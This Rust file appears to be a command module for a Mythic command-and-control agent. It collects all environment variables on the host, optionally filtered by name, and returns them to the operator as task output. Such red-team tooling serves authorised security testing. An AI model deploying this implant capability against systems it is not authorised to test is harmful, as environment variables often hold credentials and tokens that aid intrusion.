//! List environment variables — cross-platform via std::env::vars.

use mythic::{TaskMessage, TaskResponse};
use serde::Deserialize;

#[derive(Deserialize, Default)]
struct Params {
    /// Optional filter: only show vars containing this key (case-insensitive).
    #[serde(default)]
    key: Option<String>,
}

pub fn handle(task: &TaskMessage) -> TaskResponse {
    let parameters = task.parameters.trim();
    let parameters = if parameters.is_empty() {
        "{}"
    } else {
        parameters
    };
    let params = match serde_json::from_str::<Params>(parameters) {
        Ok(p) => p,
        Err(e) => return TaskResponse::failed(task.id, &format!("env parse error: {e}")),
    };

    let filter = params.key.as_ref().map(|k| k.to_lowercase());
    let mut vars: Vec<(String, String)> = std::env::vars().collect();
    vars.sort_by(|a, b| a.0.to_lowercase().cmp(&b.0.to_lowercase()));

    let output: Vec<String> = vars
        .iter()
        .filter(|(k, _)| {
            filter
                .as_ref()
                .map_or(true, |f| k.to_lowercase().contains(f))
        })
        .map(|(k, v)| format!("{k}={v}"))
        .collect();

    TaskResponse {
        task_id: task.id,
        completed: Some(true),
        status: Some("completed".into()),
        user_output: Some(if output.is_empty() {
            "(no matching env vars)".into()
        } else {
            output.join("\n")
        }),
        ..Default::default()
    }
}
